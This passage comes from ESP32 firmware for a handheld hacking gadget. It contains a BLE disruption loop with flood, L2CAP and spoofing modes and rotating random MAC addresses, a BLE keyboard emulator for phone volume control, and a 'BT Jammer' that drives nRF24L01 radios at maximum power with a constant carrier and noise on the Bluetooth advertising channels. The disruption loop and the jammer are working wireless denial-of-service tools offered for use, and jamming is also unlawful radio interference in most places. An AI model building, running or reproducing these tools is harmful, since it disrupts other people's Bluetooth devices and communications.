    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) { BLEDevice::deinit(false); return; }
    } else {
      if (holding && millis() - holdStart < 800) break;
      holding = false;
    }
    delay(20);
  }

  dhDtgMode = (DH_AtkMode)atkSel;
  BLEDevice::deinit(false); delay(100);

  // Attack loop
  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer* server = BLEDevice::createServer();
  BLEAdvertising* adv = server->getAdvertising();
  adv->setMinInterval(0x20); adv->setMaxInterval(0x40);
  dhDtgRandomMac(); delay(10);

  // First packet
  DH_AtkMode eff = dhDtgMode;
  if (eff == ATK_ALLCHAOS) eff = (DH_AtkMode)random(0, 3);
  switch (eff) {
    case ATK_FLOOD: dhDtgUpdateFlood(adv); break;
    case ATK_L2CAP: dhDtgUpdateL2CAP(adv); break;
    case ATK_SPOOF: dhDtgUpdateSpoof(adv); break;
    default: break;
  }
  adv->start();

  dhDtgPkts = 0;
  unsigned long startMs = millis(), lastDraw = 0, lastPktCount = 0;
  unsigned long lastPayload = millis(), lastMacRot = millis();
  float rate = 0;
  holdStart = 0; holding = false;
  bool stopAtk = false;

  while (!stopAtk) {
    if (millis() - lastPayload >= 50) {
      eff = dhDtgMode;
      if (eff == ATK_ALLCHAOS) eff = (DH_AtkMode)random(0, 3);
      switch (eff) {
        case ATK_FLOOD: dhDtgUpdateFlood(adv); break;
        case ATK_L2CAP: dhDtgUpdateL2CAP(adv); break;
        case ATK_SPOOF: dhDtgUpdateSpoof(adv); break;
        default: break;
      }
      dhDtgPkts++;
      lastPayload = millis();
    }

    if (millis() - lastMacRot >= 1000) {
      adv->stop(); delay(5);
      dhDtgRandomMac(); delay(5);
      adv->start();
      lastMacRot = millis();
    }

    if (millis() - lastDraw > 300) {
      unsigned long dt = millis() - lastDraw;
      unsigned long dp = dhDtgPkts - lastPktCount;
      rate = (dp * 1000.0f) / dt;
      lastPktCount = dhDtgPkts;

      tft.fillScreen(CLR_BG);
      tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
      tft.setTextColor(CLR_SECONDARY);
      tft.drawString("DISRUPTING", SCALE_X(4), SCALE_Y(3), 1);
      tft.setTextColor(CLR_SUCCESS);
      tft.drawString("[ACTIVE]", SCR_W - SCALE_X(44), SCALE_Y(3), 1);

      String tgt = dhDtgActive.name.length() > 0 ? dhDtgActive.name : dhDtgActive.mac;
      tft.setTextColor(CLR_WARNING);
      drawTruncatedText(SCALE_X(4), SCALE_Y(16), tgt.c_str(), SCR_W - SCALE_X(8), CLR_WARNING, 1);

      char buf[32];
      unsigned long elap = (millis() - startMs) / 1000;
      sprintf(buf, "Time: %lus", elap);
      tft.setTextColor(CLR_TEXT_MED); tft.drawString(buf, SCALE_X(4), SCALE_Y(32), 1);
      sprintf(buf, "Pkts: %lu", dhDtgPkts);
      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(4), SCALE_Y(46), 1);
      sprintf(buf, "Rate: %d/s", (int)rate);
      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(4), SCALE_Y(60), 1);
      tft.setTextColor(CLR_TEXT_MED);
      tft.drawString(DH_ATK_NAMES[dhDtgMode], SCALE_X(4), SCALE_Y(74), 1);

      int barW = random(10, SCR_W - SCALE_X(8));
      tft.fillRect(SCALE_X(4), SCALE_Y(88), SCR_W - SCALE_X(8), SCALE_Y(4), CLR_SURFACE);
      tft.fillRect(SCALE_X(4), SCALE_Y(88), barW, SCALE_Y(4), CLR_SECONDARY);

      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString("HOLD SEL: stop", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
      lastDraw = millis();
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 600) stopAtk = true;
    } else { holding = false; }

    yield(); delay(5);
  }

  adv->stop(); delay(100);
  BLEDevice::deinit(false); delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: iPhone Remote — BLE HID keyboard emulation
// ═══════════════════════════════════════════════════════════

static void dhRunIphoneRemote() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("iPHONE REMOTE", SCALE_X(4), SCALE_Y(2), 1);

  int y = SCALE_Y(22);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("BLE HID Keyboard", SCALE_X(4), y, 1); y += SCALE_Y(14);

  tft.setTextColor(CLR_PRIMARY);
  tft.drawString("Starting BLE HID...", SCALE_X(4), y, 1); y += SCALE_Y(14);

  BLEDevice::init("CompanionOS-KB");
  BLEServer* server = BLEDevice::createServer();

  // Create HID device
  BLEHIDDevice* hid = new BLEHIDDevice(server);
  BLECharacteristic* input = hid->inputReport(1);

  // HID Report Map for keyboard
  const uint8_t reportMap[] = {
    0x05, 0x01,  // Usage Page (Generic Desktop)
    0x09, 0x06,  // Usage (Keyboard)
    0xA1, 0x01,  // Collection (Application)
    0x85, 0x01,  // Report ID (1)
    0x05, 0x07,  // Usage Page (Keyboard/Keypad)
    0x19, 0xE0,  // Usage Minimum (Left Control)
    0x29, 0xE7,  // Usage Maximum (Right GUI)
    0x15, 0x00,  // Logical Minimum (0)
    0x25, 0x01,  // Logical Maximum (1)
    0x75, 0x01,  // Report Size (1)
    0x95, 0x08,  // Report Count (8)
    0x81, 0x02,  // Input (Data, Variable, Absolute)
    0x95, 0x01,  // Report Count (1)
    0x75, 0x08,  // Report Size (8)
    0x81, 0x01,  // Input (Constant)
    0x95, 0x05,  // Report Count (5)
    0x75, 0x01,  // Report Size (1)
    0x05, 0x08,  // Usage Page (LEDs)
    0x19, 0x01,  // Usage Minimum (Num Lock)
    0x29, 0x05,  // Usage Maximum (Kana)
    0x91, 0x02,  // Output (Data, Variable, Absolute)
    0x95, 0x01,  // Report Count (1)
    0x75, 0x03,  // Report Size (3)
    0x91, 0x01,  // Output (Constant)
    0x95, 0x06,  // Report Count (6)
    0x75, 0x08,  // Report Size (8)
    0x15, 0x00,  // Logical Minimum (0)
    0x25, 0x65,  // Logical Maximum (101)
    0x05, 0x07,  // Usage Page (Keyboard/Keypad)
    0x19, 0x00,  // Usage Minimum (0)
    0x29, 0x65,  // Usage Maximum (101)
    0x81, 0x00,  // Input (Data, Array)
    0xC0         // End Collection
  };

  hid->reportMap((uint8_t*)reportMap, sizeof(reportMap));
  hid->startServices();

  BLEAdvertising* adv = server->getAdvertising();
  adv->setAppearance(0x03C1);  // Keyboard
  adv->addServiceUUID(hid->hidService()->getUUID());
  adv->start();

  tft.fillRect(SCALE_X(4), y, SCR_W - SCALE_X(8), SCALE_Y(14), CLR_BG);
  tft.setTextColor(CLR_SUCCESS);
  tft.drawString("BLE HID active!", SCALE_X(4), y, 1); y += SCALE_Y(14);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("Pair from phone", SCALE_X(4), y, 1); y += SCALE_Y(12);
  tft.drawString("then use buttons:", SCALE_X(4), y, 1); y += SCALE_Y(14);

  tft.setTextColor(CLR_PRIMARY);
  tft.drawString("<: Vol Down", SCALE_X(4), y, 1); y += SCALE_Y(12);
  tft.drawString(">: Vol Up", SCALE_X(4), y, 1); y += SCALE_Y(12);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("HOLD SEL: exit", SCALE_X(4), SCR_H - SCALE_Y(10), 1);

  unsigned long holdStart = 0; bool holding = false;
  while (true) {
    extern void handleNetwork(); handleNetwork();
    // LEFT = Volume Down (Usage 0xEA in Consumer, but we use keyboard key 0x81)
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      uint8_t keys[8] = {0, 0, 0x81, 0, 0, 0, 0, 0};  // Volume Down
      input->setValue(keys, 8);
      input->notify();
      delay(50);
      memset(keys, 0, 8);
      input->setValue(keys, 8);
      input->notify();
      delay(200);
    }

    // RIGHT = Volume Up
    if (digitalRead(BTN_RIGHT) == LOW) {
      uint8_t keys[8] = {0, 0, 0x80, 0, 0, 0, 0, 0};  // Volume Up
      input->setValue(keys, 8);
      input->notify();
      delay(50);
      memset(keys, 0, 8);
      input->setValue(keys, 8);
      input->notify();
      delay(200);
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }

    delay(10);
  }

  adv->stop();
  BLEDevice::deinit(false);
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: BT Jammer — uses nRF24L01 to jam BLE channels
// (Unlike 2.4GHz Jammer which jams WiFi channels,
//  this specifically targets Bluetooth advertising channels)
// ═══════════════════════════════════════════════════════════

static void dhRunBtJammer() {
  // This tool needs the nRF24L01 hardware which is handled
  // in dh_radio_tools.h. Forward to the main jammer but
  // pre-set to BLE advertising channels (37, 38, 39 → 2, 26, 80)
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("BT JAMMER", SCALE_X(4), SCALE_Y(2), 1);

  tft.setTextColor(CLR_TEXT_MED);
  tft.drawString("Jams BLE advert", SCALE_X(4), SCALE_Y(24), 1);
  tft.drawString("channels 37/38/39", SCALE_X(4), SCALE_Y(36), 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawString("Needs nRF24L01!", SCALE_X(4), SCALE_Y(54), 1);

  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SEL:Start <:Back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    delay(20);
  }

  // Initialize nRF24 for BLE channel jamming
  // BLE advert channels: CH37=2402MHz, CH38=2426MHz, CH39=2480MHz
  // nRF24 channel = freq - 2400 → 2, 26, 80
  RF24 jam1(NRF1_CE_PIN, NRF1_CSN_PIN);
  RF24 jam2(NRF2_CE_PIN, NRF2_CSN_PIN);

  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI);
  delay(20);

  bool jam1Ok = jam1.begin();
  if (jam1Ok) {
    jam1.powerUp(); jam1.setAddressWidth(3); jam1.setRetries(0,0);
    jam1.setDataRate(RF24_2MBPS); jam1.setPALevel(RF24_PA_MAX);
    jam1.setCRCLength(RF24_CRC_DISABLED); jam1.setAutoAck(false);
    jam1.openWritingPipe((uint8_t*)"JAM"); jam1.stopListening();
  }

  bool jam2Ok = jam2.begin();
  if (jam2Ok) {
    jam2.powerUp(); jam2.setAddressWidth(3); jam2.setRetries(0,0);
    jam2.setDataRate(RF24_2MBPS); jam2.setPALevel(RF24_PA_MAX);
    jam2.setCRCLength(RF24_CRC_DISABLED); jam2.setAutoAck(false);
    jam2.openWritingPipe((uint8_t*)"JAM"); jam2.stopListening();
  }

  if (!jam1Ok && !jam2Ok) {
    tft.fillScreen(CLR_BG);
    tft.setTextColor(CLR_SECONDARY);
    tft.drawCentreString("nRF24 ERROR", SCR_CX, SCALE_Y(40), 1);
    tft.setTextColor(CLR_TEXT_MED);
    tft.drawCentreString("Check SPI wiring", SCR_CX, SCALE_Y(60), 1);
    delay(2500);
    return;
  }

  static const uint8_t bleChs[] = {2, 26, 80};
  int chIdx = 0;
  bool active = false;
  const uint8_t noise[32] = {
    0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,
    0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,
    0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,
    0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA
  };

  auto drawState = [&]() {
    tft.fillScreen(CLR_BG);
    tft.drawRect(0, 0, SCR_W, SCR_H, active ? CLR_SECONDARY : CLR_PRIMARY);
    tft.setTextColor(CLR_TEXT_HI);
    tft.drawString("BT JAMMER", SCALE_X(4), SCALE_Y(4), 1);
    tft.setTextColor(active ? CLR_SECONDARY : CLR_SUCCESS);
    tft.drawString(active ? "[JAMMING]" : "[READY]", SCR_W - SCALE_X(52), SCALE_Y(4), 1);

    char buf[32]; sprintf(buf, "BLE CH%d (%dMHz)", 37+chIdx, 2400+bleChs[chIdx]);
    tft.setTextColor(CLR_WARNING); tft.drawString(buf, SCALE_X(4), SCALE_Y(24), 1);

    sprintf(buf, "Radios: %d/2", (jam1Ok?1:0)+(jam2Ok?1:0));
    tft.setTextColor(CLR_TEXT_MED); tft.drawString(buf, SCALE_X(4), SCALE_Y(40), 1);

    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString("</>:CH SEL:Toggle", SCALE_X(2), SCR_H - SCALE_Y(20), 1);
    tft.drawString("HOLD SEL: exit", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
  };

  drawState();
  unsigned long holdStart = 0; bool holding = false;
  unsigned long lastDraw = millis();

  while (true) {
    extern void handleNetwork(); handleNetwork();
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      chIdx = (chIdx + 2) % 3;
      if (active && jam1Ok) jam1.startConstCarrier(RF24_PA_MAX, bleChs[chIdx]);
      drawState(); delay(180);
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      chIdx = (chIdx + 1) % 3;
      if (active && jam1Ok) jam1.startConstCarrier(RF24_PA_MAX, bleChs[chIdx]);
      drawState(); delay(180);
    }

    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) {
        if (active) { if (jam1Ok) jam1.stopConstCarrier(); if (jam2Ok) jam2.stopConstCarrier(); }
        if (jam1Ok) jam1.powerDown();
        if (jam2Ok) jam2.powerDown();
        return;
      }
    } else {
      if (holding && millis() - holdStart < 800) {
        active = !active;
        if (active) {
          if (jam1Ok) jam1.startConstCarrier(RF24_PA_MAX, bleChs[chIdx]);
          if (jam2Ok) jam2.setChannel(bleChs[chIdx]);
        } else {
          if (jam1Ok) jam1.stopConstCarrier();
          if (jam2Ok) jam2.stopConstCarrier();
        }
        drawState();
      }
      holding = false;
    }

    if (active && jam2Ok) {
      jam2.setChannel(bleChs[chIdx]);
      for (int i = 0; i < 10; i++) jam2.startWrite(noise, 32, true);
    }

    if (active && millis() - lastDraw > 300) {
      // Animated activity bars
      tft.fillRect(SCALE_X(4), SCALE_Y(56), SCR_W - SCALE_X(8), SCALE_Y(30), CLR_BG);
      for (int i = 0; i < 12; i++) {
        int h = 4 + random(0, SCALE_Y(26));
        uint16_t c = h > SCALE_Y(18) ? CLR_SECONDARY : CLR_WARNING;
        tft.fillRect(SCALE_X(6) + i * SCALE_X(12), SCALE_Y(86) - h, SCALE_X(8), h, c);
      }
      lastDraw = millis();
    }

    delay(5);
  }
}

#endif // ESP32
#endif // DH_BLE_TOOLS_H
